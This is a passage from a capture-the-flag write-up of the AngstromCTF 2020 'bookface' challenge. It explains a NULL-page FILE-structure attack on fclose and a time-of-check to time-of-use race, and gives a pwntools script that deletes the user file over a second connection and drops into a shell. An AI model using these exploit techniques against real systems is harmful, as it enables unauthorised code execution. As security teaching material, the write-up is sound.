</code></pre></div><p><strong>N.B.</strong> The <em>rdi</em> parameter must be even, the offset of <code>/bin/sh</code> string in this libc isn&rsquo;t even, we can&rsquo;t use it, so we&rsquo;ll write the <code>/bin/sh</code> string after the <em>FILE</em> structure, it&rsquo;s aligned to <em>0xf0</em>, so the string will be at <em>0x00000000000000f0</em> (since mmap maps the zero page at <em>0x0000000000000000</em>).</p><p>To triger to exploit we must call <code>fclose</code> with <em>NULL</em> pointer as parameter. So the call to <code>fopen</code> must fail and return <em>NULL</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(file, <span style=color:#e6db74>&#34;rb&#34;</span>);
fread(user, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span> (<span style=color:#66d9ef>struct</span> profile), f);
fclose(f);
</code></pre></div><p>How can <code>fopen(file, "rb")</code> fails? the mode string is <code>"rb"</code>, it&rsquo;s a read, so if the file doesn&rsquo;t exists fopen will fail and return NULL.</p><p><code>Login</code> function check if the file exists with <code>access</code> then asks for the survey, where there are multiple calls to <code>read</code>, it&rsquo;s a blocking function, it will block and wait for user input. This is a <code>Time-of-check to time-of-use</code> (TOCTOU)<sup id=fnref:12><a href=#fn:12 class=footnote-ref role=doc-noteref>12</a></sup> bug.</p><p>We&rsquo;ll open another connection and use the same userid to remove the file using the 3rd option <em>&ldquo;deleting account&rdquo;</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># logout</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;4&#34;</span>)

<span style=color:#75715e># login again with the last uid</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))

<span style=color:#75715e># remove the uid user file with another connection</span>
<span style=color:#75715e># TOCTOU</span>
raw_input(<span style=color:#e6db74>&#34;&gt; debug&#34;</span>)
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;uid: {}&#34;</span><span style=color:#f92672>.</span>format(uid))
log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;race condition !!&#34;</span>)
T2 <span style=color:#f92672>=</span> remote(T<span style=color:#f92672>.</span>rhost, T<span style=color:#f92672>.</span>rport)
T2<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Please enter your user ID: &#34;</span>, str(uid))
T2<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content&#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10&#34;</span>)
T2<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;&gt; &#34;</span>, <span style=color:#e6db74>&#34;3&#34;</span>)

payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
<span style=color:#66d9ef>assert</span> len(payload) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>12</span>
T<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;Content: &#34;</span>, payload)

T<span style=color:#f92672>.</span>clean()
T<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;uname -a;id&#34;</span>)
T<span style=color:#f92672>.</span>interactive()
</code></pre></div><h3 id=final-exploit>Final Exploit</h3><p>You can find the full exploit <a href=/post/AngstromCTF2020-bookface/exploit_bookface.py>here</a>.</p><p><img src=/post/AngstromCTF2020-bookface/screenshot1.png alt=screenshot1></p><h2 id=references>References</h2><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p><a href=https://www.ayrx.me/using-a-non-system-libc>Using a non-system glibc</a> <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p><a href=https://owasp.org/www-community/attacks/Format_string_attack>OWASP - Format String Attack</a> <a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p><a href=https://wiki.debian.org/mmap_min_addr>Debian Wiki - mmap_min_addr</a> <a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p><a href=http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Linux%20Kernel%20Exploitation%20-%20Patrick%20Biernat.pdf>Patrick Biernat - Linux Kernel Exploitation</a> <a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5 role=doc-endnote><p><a href=https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf>FILE Structures: Another Binary Exploitation Technique</a> <a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6 role=doc-endnote><p><a href=https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/>Dhaval Kapil - FILE Structure Exploitation (&lsquo;vtable&rsquo; check bypass)</a> <a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7 role=doc-endnote><p><a href=https://en.cppreference.com/w/cpp/numeric/random/RAND_MAX>C++ reference - RAND_MAX</a> <a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8 role=doc-endnote><p><a href=https://en.wikipedia.org/wiki/Pseudorandom_number_generator>Wikipedia - Pseudorandom number generator</a> <a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9 role=doc-endnote><p><a href=https://elixir.bootlin.com/>Bootlin - Elixir Cross Referencer</a> <a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10 role=doc-endnote><p><a href=https://elixir.bootlin.com/glibc/glibc-2.23/source>Bootlin Elixir - glibc-2.23</a> <a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11 role=doc-endnote><p><a href=https://elixir.bootlin.com/glibc/glibc-2.23/source/stdlib/random_r.c#L353>glibc-2.23 - __random_r</a> <a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:12 role=doc-endnote><p><a href=https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use>Time-Of-Check To Time-Of-Use</a> <a href=#fnref:12 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></div><section id=comments><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"philomath213"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></section></div></article><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js integrity="sha256-X5PoE3KU5l+JcX+w09p/wHl9AzK333C4hJ2I9S5mD4M=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js integrity="sha256-aYTdUrn6Ow1DDgh5JTc3aDGnnju48y/1c8s1dgkYPQ8=" crossorigin=anonymous></script><script id=dsq-count-scr src=//philomath213.disqus.com/count.js async></script><script>hljs.initHighlightingOnLoad();</script><script>const search_index_filename="/index.json";const i18n={'placeholder':"Search...",'results':"results found",'no_results':"No results found"};const content_type={'post':"Posts",'project':"Projects",'publication':"Publications",'talk':"Talks"};</script><script id=search-hit-fuse-template type=text/x-template>
      <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
      </div>
    </script><script src=https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin=anonymous></script><script src=/js/academic.min.d916869fdf6953df2272ba2769375b53.js></script><div class=container><footer class=site-footer><p class=powered-by>Powered by the
<a href=https://sourcethemes.com/academic/ target=_blank rel=noopener>Academic theme</a> for
<a href=https://gohugo.io target=_blank rel=noopener>Hugo</a>.
<span class=float-right aria-hidden=true><a href=# id=back_to_top><span class=button_icon><i class="fas fa-chevron-up fa-2x"></i></span></a></span></p></footer></div><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code class="tex hljs"></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i>Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i>Download</a><div id=modal-error></div></div></div></div></div></body></html>